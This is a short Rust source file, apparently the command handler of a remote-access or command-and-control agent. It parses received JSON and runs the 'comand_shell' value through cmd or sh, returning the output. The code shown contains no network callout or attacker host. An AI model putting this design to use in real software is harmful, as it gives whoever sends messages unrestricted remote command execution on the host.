use std::{env::consts, error::Error, net::TcpStream, process::Command};

use json::JsonValue;

fn shell(parsed_response_to_json: JsonValue) -> Result<String, Box<dyn Error>> {

    let os_type: &str = consts::OS;
    let comand_shell = parsed_response_to_json["comand_shell"]
        .as_str()
        .ok_or("shell comand is invalid")?;
    
    
    match os_type {
        "windows" => {
            let result_comand = Command::new("cmd")
                .args(["/C", comand_shell])
                .output()
                .expect("falid in execute command !");


                let err = String::from_utf8_lossy(&result_comand.stderr).to_string();
                let out = String::from_utf8_lossy(&result_comand.stdout).to_string();

                if err.is_empty() {
                    return Ok(out);
                }
                Ok(err)

        }
        
        _ => {
            let result_comand = Command::new("sh")
            .args(["-c", comand_shell])
            .output()
            .expect("falid in execute command !");

            let err = String::from_utf8_lossy(&result_comand.stderr).to_string();
                let out = String::from_utf8_lossy(&result_comand.stdout).to_string();

                if err.is_empty() {
                    return Ok(out);
                }
                Ok(err)
        }
    }
  }

pub fn process_instructions_recv(data_recv: String) -> Result<String, Box<dyn Error>> {

    let parsed_response_to_json: JsonValue = json::parse(data_recv.as_str())?;

    let type_instruction = parsed_response_to_json["type_instruction"]
        .as_str()
        .ok_or("type instruction is invalid")?;

     match type_instruction {
      "shell"   => {
        let res_shell = shell(parsed_response_to_json)?;
        return Ok(res_shell);
      },
     _ => return Err("a".into())
    };

    
}